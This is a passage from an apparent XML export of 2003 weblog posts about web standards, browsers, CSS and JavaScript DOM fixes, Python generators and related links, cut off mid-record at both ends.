&lt;p&gt;On the plus side, at least this will give developers who haven't yet cottoned on to the benefits of web standards time to catch up. On the minus side, once they do catch up they'll have to endure the same pains that the rest of us are putting up with now.&lt;/p&gt;

&lt;p&gt;Personally I can't wait for Firebird 1.0, which I plan to distribute to everyone I know with a Windows PC. I know it won't make the slightest bit of difference in the big picture, but at least it will help dissipate some of the frustration.&lt;/p&gt;

&lt;p&gt;Better analysis than mine:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://ln.hixie.ch/?start=1054284085&amp;amp;count=1&quot; title=&quot;AOL Agrees to Get Under Microsoft&amp;apos;s Desk&quot;&gt;Ian Hickson&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zeldman.com/daily/0503c.shtml#cnet&quot; title=&quot;IE/AOL/Netscape: what happens next?&quot;&gt;Jeffrey Zeldman&lt;/a&gt; (and &lt;a href=&quot;http://www.zeldman.com/daily/0603a.shtml#luxury&quot; title=&quot;IE/AOL: the flip side&quot;&gt;again&lt;/a&gt;, and &lt;a href=&quot;http://www.zeldman.com/daily/0603a.shtml#goredbylonghorn&quot; title=&quot;2005? Are they kidding?&quot;&gt;again&lt;/a&gt;, and &lt;a href=&quot;http://www.zeldman.com/daily/0603a.shtml#rip&quot; title=&quot;R.I.P.&quot;&gt;again&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://whatdoiknow.org/archives/001002.php&quot; title=&quot;The Disturbing Trend in Browsers&quot;&gt;Todd Dominey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-06-14 01:30:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1002</field>
		<field name="title">Small design tweak, big difference</field>
		<field name="slug">smallDesignTweak</field>
		<field name="body">&lt;p&gt;I've changed from using the day as the principle heading on the front page to using the title of each post instead. This is quite a minor alteration, but I expect it to have a relatively large impact on my blogging habits. For the past year I have treated my blog as a daily endeavour, thanks almost entirely to the way the site was layed out. This was intentional; when I orginally launched blog I made the decision to keep each entry as part of an ongoing narrative, with no individual entry titles and permalinks to entries in the context of the day they were posted.&lt;/p&gt;

&lt;p&gt;The decision not to use entry titles turned out to be &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/25/dateCentricVsEntryCentric&quot; title=&quot;Date-centric vs Entry-centric&quot;&gt;a costly mistake&lt;/a&gt;, which I eventually fixed &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/23/titlesAllTheWay&quot; title=&quot;Titles all the way&quot;&gt;back in April&lt;/a&gt;. The problem with the date headers was far more subtle: over the past few months, I've found myself frequently struggling to rush out an entry before midnight in a bid to keep up the &quot;daily&quot; nature of the site. This bizzare compulsion was spurred on by the glaring hole left in my front page if I missed a day.&lt;/p&gt;

&lt;p&gt;By removing the day headers entirely, I hope to shift the focus of this blog from religious daily updates to entries with a little more substance. I think the psychology of a blog's design is easily under-rated; I've already noticed that my blog entries have been getting longer since I started adding entry titles. At any rate, with this latest design tweak I certainly won't be rushing out poor quality entries before midnight any more.&lt;/p&gt;</field>
		<field name="created">2003-06-14 02:25:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1003</field>
		<field name="title">time_since()</field>
		<field name="slug">timeSince</field>
		<field name="body">&lt;p&gt;I've changed the date heading for each post to display the relative time since the entry was posted, rather than absolute the date and time. My main reason for doing this is that it solves the timezone problem; all times on this site are in &lt;acronym title=&quot;Greenwhich Mean Time&quot;&gt;GMT&lt;/acronym&gt;, but the majority of the site's visitors are likely to be in different timezones. Showing the time elapsed since the entry was posted serves everyone regardless of their location.&lt;/p&gt;

&lt;p&gt;Rather than write my own function for this, I have reused the one written by my girlfriend for &lt;a href=&quot;http://blog.natbat.co.uk/&quot; title=&quot;NatBat&amp;apos;s Weblog&quot;&gt;her own blog&lt;/a&gt;, which she launched a few days ago. She has described its workings in some detail in &lt;a href=&quot;http://blog.natbat.co.uk/archive/2003/Jun/14/time_since&quot; title=&quot;The time_since() function&quot;&gt;her most recent entry&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-06-14 13:54:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1004</field>
		<field name="title">Course management systems</field>
		<field name="slug">theOtherCMS</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://edtechdev.org/blog/archives/001218.html#001218&quot; title=&quot;The &amp;quot;Important&amp;quot; Characteristics of Course Management Systems&quot;&gt;EdTechDev&lt;/a&gt;, this report on &lt;a href=&quot;http://www.island.net/~leslies/blog/stories/2003/06/13/importantCharacteristicsOfCmsFindingsFromEdutools.html&quot;&gt;the important characteristics of course management systems&lt;/a&gt; makes very interesting reading. I've been considering doing something along these lines for my final year project at University, but I hadn't realised how much work had already been done in this field. It still looks like an area with a lot of space for improvement though.&lt;/p&gt;</field>
		<field name="created">2003-06-14 14:01:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1005</field>
		<field name="title">The Way Forward</field>
		<field name="slug">theWayForward</field>
		<field name="body">&lt;p&gt;Dave Shea: &lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000152.asp&quot;&gt;The Way Forward&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000152.asp&quot;&gt;&lt;p&gt;
HTML will die. Today's internet is obsolete, and anyone still coding in HTML 4 is planning the obsolescence of their own code. The big picture says that if, and this is a big if, but if we can move to an XML-based internet, then revisions to markup languages, existing and new, don't require browser updates. Once we have user agents that fully support an eXtensible Markup Language, and the style sheets used to format it, then it doesn't matter anymore if we lose the &amp;lt;cite&amp;gt; tag, or if &amp;lt;img&amp;gt; gets dropped. We create our own damn subsets that include them, and everyone else can use our subsets without downloading a new agent! Wouldn't that have been convenient 5 years ago...
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Read the rest of the post for more insightful thoughts on where &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is headed and why it makes sense to get stuck in to it as soon as possible.&lt;/p&gt;
</field>
		<field name="created">2003-06-14 14:10:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1006</field>
		<field name="title">More CSS Zen Garden submissions</field>
		<field name="slug">moreZenGarden</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.csszengarden.com/&quot;&gt;CSS Zen Garden&lt;/a&gt; is growing at a pretty impressive rate, with another three submissions since I last checked it a few days ago: &lt;a href=&quot;http://www.csszengarden.com/?cssfile=020%2F020%2Ecss&quot;&gt;Friendly Beaches&lt;/a&gt;, &lt;a href=&quot;http://www.csszengarden.com/?cssfile=021%2F021%2Ecss&quot;&gt;Calm &amp;amp; Smooth&lt;/a&gt; and &lt;a href=&quot;http://www.csszengarden.com/?cssfile=022%2F022%2Ecss&quot;&gt;Viridity&lt;/a&gt;. Also added recently is &lt;a href=&quot;http://www.csszengarden.com/?cssfile=019%2F019%2Ecss&quot;&gt;What Lies Beneath&lt;/a&gt;, which is unique in being the first horizontally rather than vertically oriented layout. It's a shame there's no automated way of tracking the garden (an &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feed of new submissions for example) as I keep on forgetting to check back for new material.&lt;/p&gt;</field>
		<field name="created">2003-06-14 14:17:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1007</field>
		<field name="title">Phil Ringnalda on Firebird extensions</field>
		<field name="slug">magpiesAndFirebirds</field>
		<field name="body">&lt;p&gt;Phil Ringnalda &lt;a href=&quot;http://philringnalda.com/blog/2003/06/firebird_extensions.php&quot; title=&quot;Firebird extensions&quot;&gt;writes about Firebird extensions&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://philringnalda.com/blog/2003/06/firebird_extensions.php&quot;&gt;&lt;p&gt;
Don't get me wrong: Firebird by itself is a wonderful browser. Just the standard tabbed browsing, so you can easily switch between several different web pages without the distracting context switch of changing entire windows, and &quot;Bookmark all tabs in a folder&quot; plus &quot;Open in tabs&quot; in bookmark groups will make a huge difference in the way you use the web. But adding extensions (which is as simple as clicking a link, then an OK button or three, and restarting the browser) gives you the added features that not everyone needs, but that will save tons of aggrevation for people like us who live on the web.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Phil goes on to describe a number of useful extensions for power browsers, some of which I am already using and some of which I'm about to install. Like Phil, I wish the documentation for creating extensions for both Firebird and Mozilla was more readily available; I'd love to mess around with extensions but I just don't have the time to dig through the many pieces of out-of-date documentation.&lt;/p&gt;
</field>
		<field name="created">2003-06-15 11:49:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1008</field>
		<field name="title">Javascript, the DOM and application/xhtml</field>
		<field name="slug">javascriptWithXML</field>
		<field name="body">&lt;p&gt;One of the side-effects of &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/06/knifeEdge&quot; title=&quot;Living on a knife edge&quot;&gt;switching my blog&lt;/a&gt; to serving pages as &lt;code&gt;application/xhtml+xml&lt;/code&gt; to browsers that support it (mainly Gecko engine browsers) was that my &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/20/blockquoteCitations&quot;&gt;blockquote citations script&lt;/a&gt; simply stopped working in those browsers. The reason this happened is touched upon by Mark Pilgrim in &lt;a href=&quot;http://www.xml.com/pub/a/2003/03/19/dive-into-xml.html&quot;&gt;The Road to XHTML 2.0: MIME Types&lt;/a&gt;: essentially, when dealing with &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; documents Gecko needs you to use &lt;code class=&quot;javascript&quot;&gt;document.createElementNS&lt;/code&gt; in place of &lt;code class=&quot;javascript&quot;&gt;document.createElement&lt;/code&gt; when manipulating the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;.&lt;/p&gt;

&lt;p&gt;I fixed this by replacing all occurrences of &lt;code class=&quot;javascript&quot;&gt;document.createElement(elementName)&lt;/code&gt; with &lt;code class=&quot;javascript&quot;&gt;document.createElementNS('http://www.w3.org/1999/xhtml', elementName)&lt;/code&gt;, thinking this would be an end to the problem. Unfortunately, this broke the script in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6, a problem which I didn't notice for several weeks as I very rarely use that browser.&lt;/p&gt;

&lt;p&gt;I began to receieve repeated reports of a scripting error in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, so the other day I finally got round to looking in to it and realised it was failing on the call to &lt;code class=&quot;javascript&quot;&gt;document.createElementNS&lt;/code&gt;. Once I'd figured that out, the solution to the problem was a little bit of object detection:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;function createElement(element) {
  if (typeof document.createElementNS != 'undefined') {
    return document.createElementNS('http://www.w3.org/1999/xhtml', element);
  }
  if (typeof document.createElement != 'undefined') {
    return document.createElement(element);
  }
  return false;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;By replacing my calls to &lt;code class=&quot;javascript&quot;&gt;document.createElementNS&lt;/code&gt; with a call to my new &lt;code class=&quot;javascript&quot;&gt;createElement&lt;/code&gt; function, I finally got the script working in both browsers. It should work in other modern &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; supporting browsers as well.&lt;/p&gt;</field>
		<field name="created">2003-06-15 12:04:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1009</field>
		<field name="title">Aha!</field>
		<field name="slug">aha</field>
		<field name="body">&lt;p&gt;Well &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=206695#c9&quot; title=&quot;Back does not refill forms for application/xhtml+xml pages&quot;&gt;that&lt;/a&gt; explains an awful lot. I was getting a huge number of complaints about lost comments when people were told off by my comment &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; checker, so it's nice to know that the problem wasn't entirely my fault! I fixed the problem (and dramatically improved the usability of the system as a whole) &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/10/homeImprovements&quot; title=&quot;Home improvements&quot;&gt;a few days ago&lt;/a&gt; by adding a proper preview / re-serve the form ability to the comments system.&lt;/p&gt;</field>
		<field name="created">2003-06-15 12:14:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1010</field>
		<field name="title">Better mailing list archive integration</field>
		<field name="slug">archiveIntegration</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://poorbuthappy.com/ease/001171.html&quot;&gt;Peter Van Djick&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://poorbuthappy.com/ease/001171.html&quot;&gt;&lt;p&gt;
Why don't emails in mailing lists with public archives have a URL in the footer to the archived version of that particular email?
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;What a fantastic idea. I'd love to do this for &lt;a href=&quot;http://www.css-discuss.org/&quot;&gt;css-discuss&lt;/a&gt;, but the &lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/&quot; title=&quot;css-discuss archive&quot;&gt;archive&lt;/a&gt; is a completely separate entity from the mailing list (it's actually just a script listening to an address that's subscribed to the list). Something like this would need to be built in to the actual mailing list software. That could be an interesting project for a rainy day.&lt;/p&gt;</field>
		<field name="created">2003-06-15 22:35:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1011</field>
		<field name="title">More practical benefits of web standards</field>
		<field name="slug">practicalBenefits</field>
		<field name="body">&lt;p&gt;D. Keith Robinson recently launched the redesigned website for the &lt;a href=&quot;http://www.drowning-prevention.org/&quot;&gt;Washington State Drowning Prevention Network&lt;/a&gt;. He has written a &lt;a href=&quot;http://www.7nights.com/asterisk/archives/web_standards_in_action.php&quot; title=&quot;Web Standards in Action&quot;&gt;fascinating account&lt;/a&gt; of the development process used for the site, which validates as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; 1.0 Transitional and uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for layout. The following extract in particular caught my eye:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.7nights.com/asterisk/archives/web_standards_in_action.php&quot;&gt;
&lt;p&gt;These major changes and layout tweaks were done in under an hour.  Because I'd built the site with Web standards they were easy.  Really easy.  The actual content changes were a snap because the code was so stripped down and clean and all the layout changes were done within the CSS file.  Without that the layout changes alone would have easily taken half a day even using sketchy &quot;find and replace&quot; methods on the 34 pages of the site.&lt;/p&gt;

&lt;p&gt;The stakeholders were ecstatic, I was relieved and the site launched on time.  A Web standards success story, and that is just the beginning.  Wait until the next time this site needs a major rework.  It will be a piece of cake and I'll look like a superstar.  And that's what it's all about, isn't it?&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-06-15 23:00:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1012</field>
		<field name="title">Improving label element discoverability</field>
		<field name="slug">labelDiscoverability</field>
		<field name="body">&lt;p&gt;My good friend Andy is soliciting applications to be his other half &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/06/14#CallMeShallow...&quot; title=&quot;Call me shallow...&quot;&gt;via his blog&lt;/a&gt;. He's a lovely guy, so &lt;a href=&quot;http://www.mooncalf.me.uk/romance/&quot; title=&quot;The Romance Test&quot;&gt;go sign up&lt;/a&gt;! More importantly, the &lt;a href=&quot;http://www.mooncalf.me.uk/romance/style.css&quot;&gt;stylesheet&lt;/a&gt; for his romance test includes this gem:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;label {
    cursor: pointer;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I'm a huge fan of the greatly under-rated &lt;code class=&quot;html&quot;&gt;&amp;lt;label&amp;gt;&lt;/code&gt; element, but I've always worried about it's low discoverability. I'd never thought of using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; to change the mouse pointer. I've added that to my stylesheet and I'll definitely be using it in the future.&lt;/p&gt;</field>
		<field name="created">2003-06-15 23:35:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1013</field>
		<field name="title">Tim Bray on search</field>
		<field name="slug">timBrayOnSearch</field>
		<field name="body">&lt;p&gt;I love it when bloggers stick to their word. The other day, while &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/06/13/PerfectWeb&quot; title=&quot;Antibiotic Days&quot;&gt;describing a quick Perl hack&lt;/a&gt; that really impressed a major client a few years ago, Tim Bray mentioned the following:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.tbray.org/ongoing/When/200x/2003/06/13/PerfectWeb&quot;&gt;&lt;p&gt;
Then I turned on Microsoft's search engine, at that time called Index Server, now I believe called Index Services, which is a pretty nice tool (we don't have the equivalent in the Open Source world, more on that another time).
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;And sure enough, he's just posted the &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/06/15/OnSearch&quot; title=&quot;On Search: Backgrounder&quot;&gt;first in a series&lt;/a&gt; of essays on full-text search. Go read it: it's really interesting stuff. Tim's conclusion is:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.tbray.org/ongoing/When/200x/2003/06/15/OnSearch&quot;&gt;&lt;p&gt;
What we need is for Apache to come out-of-the-box with a built-in search capability that you just push a button and it works, and it's fast, and doesn't need much care and feeding, and it's internationalized, and it has the right API for when you want to get fancy.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Until that happens, I will happily recommend MySQL's built in fulltext search indexing for quickly adding a relatively powerful search facility to a site. I &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/25/siteSearch&quot; title=&quot;Site search finally available&quot;&gt;use it on this blog&lt;/a&gt; and my only real criticism is that it insists on search words of at least 4 letters, which is less than ideal when most of your entries include &lt;acronym title=&quot;Three Letter Acronyms&quot;&gt;TLA&lt;/acronym&gt;s. Hopefully they'll provide a way around this limitation in a future release.&lt;/p&gt;</field>
		<field name="created">2003-06-16 15:37:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1014</field>
		<field name="title">Missing the point</field>
		<field name="slug">missingThePoint</field>
		<field name="body">&lt;p&gt;The Register's &lt;a href=&quot;http://www.theregister.co.uk/content/4/31205.html&quot; title=&quot;Microsoft gives IE for Mac the boot&quot;&gt;coverage&lt;/a&gt; of the end of development for &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; on the Mac makes some worrying conclusions:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.theregister.co.uk/content/4/31205.html&quot;&gt;
&lt;p&gt;Had Apple worked with inspired vigor since January to improve Safari, users might feel safe without IE. This hasn't happened. Plenty of improvements have been made, but Safari still lacks the widespread Web site compatibility needed to be the sole browser of choice.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;In addition, the horrid state of IE makes life without it seem a rather pleasant concept. Who needs a rectangle with no tools when add-blocking, fast, feature-rich options like Safari and Opera exist?&lt;/p&gt;

&lt;p&gt;Sadly, Apple users do.&lt;/p&gt;

&lt;p&gt;Unless Apple can prove without question that it can handle any Web site with its final release of Safari, users should start to get very nervous and hope Opera and Mozilla developers take charge.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This misses the point entirely. The problem isn't the quality of the browser, it's the quality of the web sites themselves. &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; for Windows has a ridiculously loose &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; parser that will interpret and display just about any garbage you care to throw at it. Since its market share is so high (more than 90% for many commercial web sites) lazy web developers write for &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; rather than writing standards compliant markup. The only way a competing browser could render those sites in exactly the same way as &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; would be for it to reverse engineer the &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; rendering engine in its entirety, which kind of eliminates the point of having a different browser in the first place.&lt;/p&gt;

&lt;p&gt;Safari's most important feature (at least &lt;a href=&quot;http://mwsf.macnn.com/&quot; title=&quot;Keynote Coverage of MacWorld 2003&quot;&gt;according to Steve Jobs&lt;/a&gt;) is its speed. This speed is achieved mainly thanks to a highly optimised rendering engine. If they were to add in enough code to completely emulate &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s broken behaviour, the speed advantage would be gone.&lt;/p&gt;

&lt;p&gt;What worried me is that a publication with more technical awareness than most could misunderstand the issues this much.&lt;/p&gt;

&lt;p&gt;Incidentally, the only way this problem is going to get any better is through persistant advocacy to the many sites that have broken &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. If a site doesn't work in a modern standards compliant browser, tell them! The best way to do it is over the 'phone (if they list a number on the site) as that will cost them more in terms of customer service expenses, but a polite email to the right address is almost as good. If you don't get a favourable response, the &lt;a href=&quot;http://www.mozilla.org/projects/tech-evangelism/site/&quot;&gt;Mozilla Tech Evangelism&lt;/a&gt; team may be able to back you up (especially if the problem is with a major site) - see this page for details of &lt;a href=&quot;http://www.mozilla.org/projects/tech-evangelism/site/procedures.html&quot; title=&quot;Mozilla Site Evangelism Procedures&quot;&gt;their procedures&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;And finally, if you develop sites yourself learn to &lt;a href=&quot;http://www.webstandards.org/&quot; title=&quot;The Web Standards Project&quot;&gt;code to the standards&lt;/a&gt; instead of coding for a specific browser. A one-browser web would be a very boring place indeed.&lt;/p&gt;</field>
		<field name="created">2003-06-16 17:48:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1015</field>
		<field name="title">Further more...</field>
		<field name="slug">furtherMore</field>
		<field name="body">&lt;p&gt;By coincidence, Jeffrey Zeldman just posted &lt;a href=&quot;http://www.zeldman.com/daily/0603a.shtml#conspiracytheory&quot; title=&quot;Conspiracy theory&quot;&gt;something in a similar vein&lt;/a&gt; to my &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/16/missingThePoint&quot; title=&quot;Missing the point&quot;&gt;previous rant&lt;/a&gt;, looking at things from a different angle:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.zeldman.com/daily/0603a.shtml#conspiracytheory&quot;&gt;
&lt;p&gt;By its recent actions, Microsoft seems to believe that if consumers want the Internet, they will use the next version of Widows to access Microsoft-based web services and MSN content, and to download XBox patches. And some consumers will do just that. But consumers have a choice.&lt;/p&gt;

&lt;p&gt;By its recent actions, Microsoft has also made dupes of its employees who contributed to web standards. In light of recent news, it appears the company tolerated these employees' activities because they pacified the developer community.&lt;/p&gt;

&lt;p&gt;Yet regardless of Microsoft's intentions, those standards did make it into all recent browsers and the availability of browsers that commonly support CSS1, XHTML, some of CSS2, and the DOM is changing the way designers and developers create websites. And that will not stop. So long as we design with standards, we and the end-users on whose behalf we toil will continue to have a choice.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-06-16 18:11:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1016</field>
		<field name="title">Evangelism is WAR</field>
		<field name="slug">evangelism</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.plamondon.net/james/02_plamondon.htm&quot;&gt;Evangelism is WAR&lt;/a&gt; is a fascinating account (actually, the first chapter of an upcoming book) of the principles behind Technical Evangelism at Microsoft and the methods they use to establish their platforms as the dominant players. It's author is James Plamondon, who worked at Microsoft as a Technical Evangelist for 8 years. It's a great read, and it's also entertaining to see developers and customers referred to as &quot;pawns&quot; throughout. Found via a link on the &lt;a href=&quot;http://www.mozilla.org/projects/tech-evangelism/about.html&quot; title=&quot;About Technology Evangelism&quot;&gt;Mozilla Tech Evangelism site&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2003-06-16 18:30:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1017</field>
		<field name="title">Another MP Blogger</field>
		<field name="slug">anotherMPBlogger</field>
		<field name="body">&lt;p&gt;Fantastic! &lt;a href=&quot;http://www.tom-watson.co.uk/&quot;&gt;Tom Watson&lt;/a&gt; has now been joined by &lt;a href=&quot;http://www.sheffieldhallam.co.uk/blog/&quot; title=&quot;Richard Allam&amp;apos;s Weblog&quot;&gt;Richard Allan&lt;/a&gt; (Liberal Democrat &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt; for Sheffield Hallam) in the ranks of &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt;s with their own weblog. It looks like it's going to be really good; Richard is something of a geek (he runs RedHat 8.0 at home) and in &lt;a href=&quot;http://www.sheffieldhallam.co.uk/blog/index.php?m=200306#5&quot;&gt;one of his first entries&lt;/a&gt; he takes advantage of his position as an &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt; to extract information from Tiscali about broadband pricing issues in the &lt;acronym title=&quot;United Kingdom&quot;&gt;UK&lt;/acronym&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; &lt;a href=&quot;http://www.sheffieldhallam.co.uk/mod.php?mod=userpage&amp;amp;menu=13&amp;amp;page_id=3&quot; title=&quot;Biographical information about Shefield Hallam&amp;apos;s MP&quot;&gt;Further reading&lt;/a&gt; reveals that he is the Liberal Democrat spokesman on information technology, and a member of a number of technology related government groups.&lt;/p&gt;</field>
		<field name="created">2003-06-16 18:51:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1018</field>
		<field name="title">Accesskeys on ALA</field>
		<field name="slug">accesskeys</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.alistapart.com/stories/accesskeys/&quot;&gt;Accesskeys: Unlocking Hidden Navigation&lt;/a&gt; is the first new technical article on A List Apart in months. I didn't think there was much that could be said about accesskeys, but the tutorial has some nice ideas to help make them more obvious without being too intrusive. I think the approach demonstrated by the &lt;a href=&quot;http://www.energy.gov.on.ca/index.cfm?fuseaction=english.conservation&quot;&gt;The Ontario Ministry of Energy&lt;/a&gt; site is the most appealing, with single letters corresponding to accesskeys underlined as they are in application menus.&lt;/p&gt;</field>
		<field name="created">2003-06-16 21:09:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1019</field>
		<field name="title">Python generators for database result sets</field>
		<field name="slug">nowIUnderstand</field>
		<field name="body">&lt;p&gt;I've read several articles on Python generators now, and I had &lt;em&gt;almost&lt;/em&gt; got my head around them, but then I read this: &lt;a href=&quot;http://www.halfcooked.com/mt/archives/000497.html&quot;&gt;Iterators and Databases&lt;/a&gt; by Andy Todd, which demonstrates a simple but intuitive way of using generators to iterate through rows from a database query without having to load all of the rows in to a list in memory first. Brilliant.&lt;/p&gt;

&lt;p&gt;Andy links to &lt;a href=&quot;http://www-106.ibm.com/developerworks/linux/library/l-cpyiter.html&quot; title=&quot;Charming Python: Using combinatorial functions in the itertools module&quot;&gt;this article&lt;/a&gt; which includes a nice one line summary of why generators exist (generators return iterators):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www-106.ibm.com/developerworks/linux/library/l-cpyiter.html&quot;&gt;&lt;p&gt;
The motivation behind iterators is twofold. Working with data as sequences is often the most straightforward approach, and a sequence that is processed in linear order often does not need to actually exist all at once.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;More on generators:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www-106.ibm.com/developerworks/library/l-pycon.html&quot;&gt;Charming Python: Iterators and simple generators&lt;/a&gt; is a good introductory tutorial&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.python.org/peps/pep-0255.html&quot;&gt;PEP 255: Simple Generators&lt;/a&gt; is the &lt;acronym title=&quot;Python Enhancement Proposal&quot;&gt;PEP&lt;/acronym&gt; that formally describes the language feature&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-06-17 19:40:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1020</field>
		<field name="title">Origin of &quot;list comprehension&quot;</field>
		<field name="slug">setTheory</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.hole.fi/jajvirta/weblog/20030617T1401.html&quot; title=&quot;Ongoing evolution of the front page of my weblog&quot;&gt;Jarno Virtanen&lt;/a&gt;, a &lt;a href=&quot;http://groups.google.com/groups?th=c803c13ddfa9cf19#link4&quot; title=&quot;Re: comprehending comprehensions&quot;&gt;comp.lang.python post&lt;/a&gt; explaining the origin of the term &quot;list comprehension&quot;, Python's clever alternative syntax for filtering lists (see &lt;a href=&quot;diveintopython.org/odbchelper_map.html&quot; title=&quot;1.13. Mapping lists&quot;&gt;this chapter&lt;/a&gt; of Dive Into Python). The term comes from set theory; it's nice to know that stuff was worth learning after all ;)&lt;/p&gt;</field>
		<field name="created">2003-06-17 19:48:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1021</field>
		<field name="title">IRC on your mobile</field>
		<field name="slug">mobileIRC</field>
